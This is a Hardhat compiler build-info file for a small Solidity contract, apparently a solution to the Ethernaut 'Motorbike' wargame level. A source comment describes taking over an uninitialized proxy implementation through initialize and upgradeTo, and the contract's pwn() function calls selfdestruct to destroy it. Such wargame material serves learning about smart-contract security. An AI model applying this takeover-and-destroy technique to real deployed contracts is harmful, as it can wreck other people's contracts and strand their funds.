{
	"id": "44f3256400effffafbad86df3c7bc015",
	"_format": "hh-sol-build-info-1",
	"solcVersion": "0.6.7",
	"solcLongVersion": "0.6.7+commit.b8d736ae",
	"input": {
		"language": "Solidity",
		"settings": {
			"optimizer": {
				"enabled": true,
				"runs": 200
			},
			"outputSelection": {
				"*": {
					"": [
						"ast"
					],
					"*": [
						"abi",
						"metadata",
						"devdoc",
						"userdoc",
						"storageLayout",
						"evm.legacyAssembly",
						"evm.bytecode",
						"evm.deployedBytecode",
						"evm.methodIdentifiers",
						"evm.gasEstimates",
						"evm.assembly"
					]
				}
			}
		},
		"sources": {
			"ethernaut/MotorbikeBreaker.sol": {
				"content": "// SPDX-License-Identifier: MIT\npragma solidity <0.7.0;\n\n/**\n    Get the contract from address from the implementation slot using the getStorageAt function \n    Get the address of the actual contract \n    call initialize on it to become the owner \n    and call upgradeTo method using this contrac\n\n*/\n\ncontract MotorbikeBreaker {\n  function pwn() public {\n    selfdestruct(address(0));\n  }\n}"
			}
		}
	},
	"output": {
		"contracts": {
			"ethernaut/MotorbikeBreaker.sol": {
				"MotorbikeBreaker": {
					"abi": [
						{
							"inputs": [],
							"name": "pwn",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"methods": {}
					},
					"evm": {
						"assembly": "    /* \"ethernaut/MotorbikeBreaker.sol\":302:391  contract MotorbikeBreaker {... */\n  mstore(0x40, 0x80)\n  callvalue\n    /* \"--CODEGEN--\":5:14   */\n  dup1\n    /* \"--CODEGEN--\":2:4   */\n  iszero\n  tag_1\n  jumpi\n    /* \"--CODEGEN--\":27:28   */\n  0x00\n    /* \"--CODEGEN--\":24:25   */\n  dup1\n    /* \"--CODEGEN--\":17:29   */\n  revert\n    /* \"--CODEGEN--\":2:4   */\ntag_1:\n    /* \"ethernaut/MotorbikeBreaker.sol\":302:391  contract MotorbikeBreaker {... */\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"ethernaut/MotorbikeBreaker.sol\":302:391  contract MotorbikeBreaker {... */\n      mstore(0x40, 0x80)\n      callvalue\n        /* \"--CODEGEN--\":5:14   */\n      dup1\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_1\n      jumpi\n        /* \"--CODEGEN--\":27:28   */\n      0x00\n        /* \"--CODEGEN--\":24:25   */\n      dup1\n        /* \"--CODEGEN--\":17:29   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_1:\n        /* \"ethernaut/MotorbikeBreaker.sol\":302:391  contract MotorbikeBreaker {... */\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0xdd365b8b\n      eq\n      tag_3\n      jumpi\n    tag_2:\n        /* \"--CODEGEN--\":12:13   */\n      0x00\n        /* \"--CODEGEN--\":9:10   */\n      dup1\n        /* \"--CODEGEN--\":2:14   */\n      revert\n        /* \"ethernaut/MotorbikeBreaker.sol\":332:389  function pwn() public {... */\n    tag_3:\n      tag_4\n      tag_5\n      jump\t// in\n    tag_4:\n      stop\n    tag_5:\n        /* \"ethernaut/MotorbikeBreaker.sol\":381:382  0 */\n      0x00\n        /* \"ethernaut/MotorbikeBreaker.sol\":360:384  selfdestruct(address(0)) */\n      selfdestruct\n\n    auxdata: 0xa2646970667358221220b6c728bb419de19af62bc9df64724a50426e2b8c2c66cacb940cc8072971cb5964736f6c63430006070033\n}\n",
						"bytecode": {
							"linkReferences": {},
							"object": "6080604052348015600f57600080fd5b50606f80601d6000396000f3fe6080604052348015600f57600080fd5b506004361060285760003560e01c8063dd365b8b14602d575b600080fd5b60336035565b005b6000fffea2646970667358221220b6c728bb419de19af62bc9df64724a50426e2b8c2c66cacb940cc8072971cb5964736f6c63430006070033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH1 0xF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x6F DUP1 PUSH1 0x1D PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH1 0xF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH1 0x28 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0xDD365B8B EQ PUSH1 0x2D JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x33 PUSH1 0x35 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 SELFDESTRUCT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xB6 0xC7 0x28 0xBB COINBASE SWAP14 0xE1 SWAP11 0xF6 0x2B 0xC9 0xDF PUSH5 0x724A50426E 0x2B DUP13 0x2C PUSH7 0xCACB940CC80729 PUSH18 0xCB5964736F6C634300060700330000000000 ",
							"sourceMap": "302:89:0:-:0;;;;5:9:-1;2:2;;;27:1;24;17:12;2:2;302:89:0;;;;;;;"
						},
						"deployedBytecode": {
							"immutableReferences": {},
							"linkReferences": {},
							"object": "6080604052348015600f57600080fd5b506004361060285760003560e01c8063dd365b8b14602d575b600080fd5b60336035565b005b6000fffea2646970667358221220b6c728bb419de19af62bc9df64724a50426e2b8c2c66cacb940cc8072971cb5964736f6c63430006070033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH1 0xF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH1 0x28 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0xDD365B8B EQ PUSH1 0x2D JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x33 PUSH1 0x35 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 SELFDESTRUCT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xB6 0xC7 0x28 0xBB COINBASE SWAP14 0xE1 SWAP11 0xF6 0x2B 0xC9 0xDF PUSH5 0x724A50426E 0x2B DUP13 0x2C PUSH7 0xCACB940CC80729 PUSH18 0xCB5964736F6C634300060700330000000000 ",
							"sourceMap": "302:89:0:-:0;;;;5:9:-1;2:2;;;27:1;24;17:12;2:2;302:89:0;;;;;;;;;;;;;;;;12:1:-1;9;2:12;332:57:0;;;:::i;:::-;;;381:1;360:24"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "22200",
								"executionCost": "75",
								"totalCost": "22275"
							},
							"external": {
								"pwn()": "30116"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 302,
									"end": 391,
									"name": "PUSH",
									"source": 0,
									"value": "80"
								},
								{
									"begin": 302,
									"end": 391,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 302,
									"end": 391,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 302,
									"end": 391,
									"name": "CALLVALUE",
									"source": 0
								},
								{
									"begin": 5,
									"end": 14,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 2,
									"end": 4,
									"name": "ISZERO",
									"source": -1
								},
								{
									"begin": 2,
									"end": 4,
									"name": "PUSH [tag]",
									"source": -1,
									"value": "1"
								},
								{
									"begin": 2,
									"end": 4,
									"name": "JUMPI",
									"source": -1
								},
								{
									"begin": 27,
									"end": 28,
									"name": "PUSH",
									"source": -1,
									"value": "0"
								},
								{
									"begin": 24,
									"end": 25,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 17,
									"end": 29,
									"name": "REVERT",
									"source": -1
								},
								{
									"begin": 2,
									"end": 4,
									"name": "tag",
									"source": -1,
									"value": "1"
								},
								{
									"begin": 2,
									"end": 4,
									"name": "JUMPDEST",
									"source": -1
								},
								{
									"begin": 302,
									"end": 391,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 302,
									"end": 391,
									"name": "PUSH #[$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 302,
									"end": 391,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 302,
									"end": 391,
									"name": "PUSH [$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 302,
									"end": 391,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 302,
									"end": 391,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 302,
									"end": 391,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 302,
									"end": 391,
									"name": "RETURN",
									"source": 0
								}
							],
							".data": {
								"0": {
									".auxdata": "a2646970667358221220b6c728bb419de19af62bc9df64724a50426e2b8c2c66cacb940cc8072971cb5964736f6c63430006070033",
									".code": [
										{
											"begin": 302,
											"end": 391,
											"name": "PUSH",
											"source": 0,
											"value": "80"
										},
										{
											"begin": 302,
											"end": 391,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 302,
											"end": 391,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 302,
											"end": 391,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 5,
											"end": 14,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "1"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 27,
											"end": 28,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 24,
											"end": 25,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 17,
											"end": 29,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"source": -1,
											"value": "1"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 302,
											"end": 391,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 302,
											"end": 391,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 302,
											"end": 391,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 302,
											"end": 391,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 302,
											"end": 391,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 302,
											"end": 391,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 302,
											"end": 391,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 302,
											"end": 391,
											"name": "CALLDATALOAD",
											"source": 0
										},
										{
											"begin": 302,
											"end": 391,
											"name": "PUSH",
											"source": 0,
											"value": "E0"
										},
										{
											"begin": 302,
											"end": 391,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 302,
											"end": 391,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 302,
											"end": 391,
											"name": "PUSH",
											"source": 0,
											"value": "DD365B8B"
										},
										{
											"begin": 302,
											"end": 391,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 302,
											"end": 391,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 302,
											"end": 391,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 302,
											"end": 391,
											"name": "tag",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 302,
											"end": 391,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 12,
											"end": 13,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 9,
											"end": 10,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 2,
											"end": 14,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 332,
											"end": 389,
											"name": "tag",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 332,
											"end": 389,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 332,
											"end": 389,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 332,
											"end": 389,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 332,
											"end": 389,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 332,
											"end": 389,
											"name": "tag",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 332,
											"end": 389,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 332,
											"end": 389,
											"name": "STOP",
											"source": 0
										},
										{
											"begin": 332,
											"end": 389,
											"name": "tag",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 332,
											"end": 389,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 381,
											"end": 382,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 360,
											"end": 384,
											"name": "SELFDESTRUCT",
											"source": 0
										}
									]
								}
							}
						},
						"methodIdentifiers": {
							"pwn()": "dd365b8b"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.7+commit.b8d736ae\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"name\":\"pwn\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{},\"notice\":\"Get the contract from address from the implementation slot using the getStorageAt function  Get the address of the actual contract  call initialize on it to become the owner  and call upgradeTo method using this contrac\"}},\"settings\":{\"compilationTarget\":{\"ethernaut/MotorbikeBreaker.sol\":\"MotorbikeBreaker\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":true,\"runs\":200},\"remappings\":[]},\"sources\":{\"ethernaut/MotorbikeBreaker.sol\":{\"keccak256\":\"0xe363f28d3970cb907c572512f82143b785b9cc1b2cc45ea5e6d19a57fb5765f2\",\"urls\":[\"bzz-raw://0867c989415fae17e60f5ef2691e99dd2fdb35d799b309b74e20667e18a911f8\",\"dweb:/ipfs/QmYzEkXtBM48mKHvH7vofP7Zy42jghvXAMYNjiuJqr6mrv\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"methods": {},
						"notice": "Get the contract from address from the implementation slot using the getStorageAt function  Get the address of the actual contract  call initialize on it to become the owner  and call upgradeTo method using this contrac"
					}
				}
			}
		},
		"sources": {
			"ethernaut/MotorbikeBreaker.sol": {
				"ast": {
					"absolutePath": "ethernaut/MotorbikeBreaker.sol",
					"exportedSymbols": {
						"MotorbikeBreaker": [
							14
						]
					},
					"id": 15,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1,
							"literals": [
								"solidity",
								"<",
								"0.7",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "32:23:0"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "contract",
							"documentation": {
								"id": 2,
								"nodeType": "StructuredDocumentation",
								"src": "57:243:0",
								"text": "Get the contract from address from the implementation slot using the getStorageAt function \nGet the address of the actual contract \ncall initialize on it to become the owner \nand call upgradeTo method using this contrac"
							},
							"fullyImplemented": true,
							"id": 14,
							"linearizedBaseContracts": [
								14
							],
							"name": "MotorbikeBreaker",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"body": {
										"id": 12,
										"nodeType": "Block",
										"src": "354:35:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"hexValue": "30",
																	"id": 8,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "381:1:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	},
																	"value": "0"
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	}
																],
																"id": 7,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "373:7:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_$",
																	"typeString": "type(address)"
																},
																"typeName": {
																	"id": 6,
																	"name": "address",
																	"nodeType": "ElementaryTypeName",
																	"src": "373:7:0",
																	"typeDescriptions": {
																		"typeIdentifier": null,
																		"typeString": null
																	}
																}
															},
															"id": 9,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "373:10:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														],
														"id": 5,
														"name": "selfdestruct",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": -21,
														"src": "360:12:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_selfdestruct_nonpayable$_t_address_payable_$returns$__$",
															"typeString": "function (address payable)"
														}
													},
													"id": 10,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "360:24:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 11,
												"nodeType": "ExpressionStatement",
												"src": "360:24:0"
											}
										]
									},
									"documentation": null,
									"functionSelector": "dd365b8b",
									"id": 13,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "pwn",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 3,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "344:2:0"
									},
									"returnParameters": {
										"id": 4,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "354:0:0"
									},
									"scope": 14,
									"src": "332:57:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								}
							],
							"scope": 15,
							"src": "302:89:0"
						}
					],
					"src": "32:359:0"
				},
				"id": 0
			}
		}
	}
}